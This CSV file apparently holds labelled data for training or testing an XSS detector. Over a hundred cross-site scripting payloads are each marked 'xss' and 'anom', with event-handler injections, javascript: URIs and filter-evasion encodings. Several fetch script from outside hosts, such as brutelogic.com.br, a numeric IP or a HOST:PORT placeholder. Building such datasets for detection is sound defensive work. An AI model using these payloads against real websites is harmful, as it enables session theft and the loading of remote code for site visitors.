payload,length,attack_type,label
"""-prompt(8)-""",13,xss,anom
'-prompt(8)-',13,xss,anom
""";a=prompt,a()//",16,xss,anom
"';a=prompt,a()//",16,xss,anom
"'-eval(""window['pro'%2B'mpt'](8)"")-'",36,xss,anom
"""-eval(""window['pro'%2B'mpt'](8)"")-""",36,xss,anom
"""onclick=prompt(8)>""@x.y",24,xss,anom
"""onclick=prompt(8)><svg/onload=prompt(8)>""@x.y",46,xss,anom
<image/src/onerror=prompt(8)>,29,xss,anom
<img/src/onerror=prompt(8)>,27,xss,anom
<image src/onerror=prompt(8)>,29,xss,anom
<img src/onerror=prompt(8)>,27,xss,anom
<image src =q onerror=prompt(8)>,32,xss,anom
<img src =q onerror=prompt(8)>,30,xss,anom
</scrip</script>t><img src =q onerror=prompt(8)>,48,xss,anom
<svg onload=alert(1)>,21,xss,anom
"""><svg onload=alert(1)//",24,xss,anom
"""onmouseover=alert(1)//",23,xss,anom
"""autofocus/onfocus=alert(1)//",29,xss,anom
'-alert(1)-',12,xss,anom
'-alert(1)//,12,xss,anom
\'-alert(1)//,13,xss,anom
</script><svg onload=alert(1)>,30,xss,anom
<x contenteditable onblur=alert(1)>lose focus!,46,xss,anom
<x onclick=alert(1)>click this!,31,xss,anom
<x oncopy=alert(1)>copy this!,29,xss,anom
<x oncontextmenu=alert(1)>right click this!,43,xss,anom
<x oncut=alert(1)>copy this!,28,xss,anom
<x ondblclick=alert(1)>double click this!,41,xss,anom
<x ondrag=alert(1)>drag this!,29,xss,anom
<x contenteditable onfocus=alert(1)>focus this!,47,xss,anom
<x contenteditable oninput=alert(1)>input here!,47,xss,anom
<x contenteditable onkeydown=alert(1)>press any key!,52,xss,anom
<x contenteditable onkeypress=alert(1)>press any key!,53,xss,anom
<x contenteditable onkeyup=alert(1)>press any key!,50,xss,anom
<x onmousedown=alert(1)>click this!,35,xss,anom
<x onmousemove=alert(1)>hover this!,35,xss,anom
<x onmouseout=alert(1)>hover this!,34,xss,anom
<x onmouseover=alert(1)>hover this!,35,xss,anom
<x onmouseup=alert(1)>click this!,33,xss,anom
<x contenteditable onpaste=alert(1)>paste here!,47,xss,anom
<script>alert(1)//,18,xss,anom
<script>alert(1)<!–,19,xss,anom
<script src=//brutelogic.com.br/1.js>,37,xss,anom
<script src=//3334957647/1>,27,xss,anom
%3Cx onxxx=alert(1),19,xss,anom
<%78 onxxx=1,12,xss,anom
<x %6Fnxxx=1,12,xss,anom
<x o%6Exxx=1,12,xss,anom
<x on%78xx=1,12,xss,anom
<x onxxx%3D1,12,xss,anom
<X onxxx=1,10,xss,anom
<x OnXxx=1,10,xss,anom
<X OnXxx=1,10,xss,anom
<x onxxx=1 onxxx=1,18,xss,anom
<x/onxxx=1,10,xss,anom
<x%09onxxx=1,12,xss,anom
<x%0Aonxxx=1,12,xss,anom
<x%0Conxxx=1,12,xss,anom
<x%0Donxxx=1,12,xss,anom
<x%2Fonxxx=1,12,xss,anom
<x 1='1'onxxx=1,15,xss,anom
"<x 1=""1""onxxx=1",15,xss,anom
<x </onxxx=1,12,xss,anom
"<x 1="">"" onxxx=1",16,xss,anom
<http://onxxx%3D1/,18,xss,anom
<x onxxx=alert(1) 1=',21,xss,anom
"<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>",113,xss,anom
'onload=alert(1)><svg/1=',25,xss,anom
'>alert(1)</script><script/1=',30,xss,anom
*/alert(1)</script><script>/*,29,xss,anom
"*/alert(1)"">'onload=""/*<svg/1='",31,xss,anom
"`-alert(1)"">'onload=""`<svg/1='",30,xss,anom
*/</script>'>alert(1)/*<script/1=',34,xss,anom
<script>alert(1)</script>,25,xss,anom
<script src=javascript:alert(1)>,32,xss,anom
<iframe src=javascript:alert(1)>,32,xss,anom
<embed src=javascript:alert(1)>,31,xss,anom
<a href=javascript:alert(1)>click,33,xss,anom
<math><brute href=javascript:alert(1)>click,43,xss,anom
<form action=javascript:alert(1)><input type=submit>,52,xss,anom
<isindex action=javascript:alert(1) type=submit value=click>,60,xss,anom
<form><button formaction=javascript:alert(1)>click,50,xss,anom
<form><input formaction=javascript:alert(1) type=submit value=click>,68,xss,anom
<form><input formaction=javascript:alert(1) type=image value=click>,67,xss,anom
<form><input formaction=javascript:alert(1) type=image src=SOURCE>,66,xss,anom
<isindex formaction=javascript:alert(1) type=submit value=click>,64,xss,anom
<object data=javascript:alert(1)>,33,xss,anom
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>,56,xss,anom
"<svg><script xlink:href=data:,alert(1) />",41,xss,anom
<math><brute xlink:href=javascript:alert(1)>click,49,xss,anom
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>,150,xss,anom
<html ontouchstart=alert(1)>,28,xss,anom
<html ontouchend=alert(1)>,26,xss,anom
<html ontouchmove=alert(1)>,27,xss,anom
<html ontouchcancel=alert(1)>,29,xss,anom
<body onorientationchange=alert(1)>,35,xss,anom
"""><img src=1 onerror=alert(1)>.gif",34,xss,anom
"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""alert(document.domain)""/>",73,xss,anom
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;,57,xss,anom
"<script src=""data:&comma;alert(1)//",35,xss,anom
"""><script src=data:&comma;alert(1)//",36,xss,anom
"<script src=""//brutelogic.com.br&sol;1.js&num;",46,xss,anom
"""><script src=//brutelogic.com.br&sol;1.js&num;",47,xss,anom
"<link rel=import href=""data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;",85,xss,anom
"""><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;",86,xss,anom
<base href=//0>,15,xss,anom
"<script/src=""data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)",70,xss,anom
<body onload=alert(1)>,22,xss,anom
